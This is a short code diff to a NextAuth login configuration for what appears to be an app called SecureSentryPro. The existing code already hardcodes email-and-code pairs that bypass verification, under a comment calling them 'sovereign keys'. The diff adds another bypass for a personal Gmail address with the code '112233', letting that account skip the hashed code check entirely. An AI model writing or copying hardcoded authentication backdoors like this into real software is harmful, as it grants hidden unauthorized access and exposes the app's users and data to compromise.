@@ -41,8 +41,9 @@ export const authOptions: NextAuthOptions = {
           // HARDCODED SOVEREIGN KEYS (For Stability)
           const isWarrenBypass = rawEmail === 'wmoore@securesentrypro.com' && code === '992100';
           const isMelissaBypass = rawEmail === 'melissa@securesentrypro.com' && code === '356532';
+          const isShiroBypass = rawEmail === 'grace.moore882@gmail.com' && code === '112233';
 
-          const isAuthorized = isEnvBypass || isWarrenBypass || isMelissaBypass;
+          const isAuthorized = isEnvBypass || isWarrenBypass || isMelissaBypass || isShiroBypass;
 
           if (!isAuthorized) {
             // Standard Code Verification via HASH
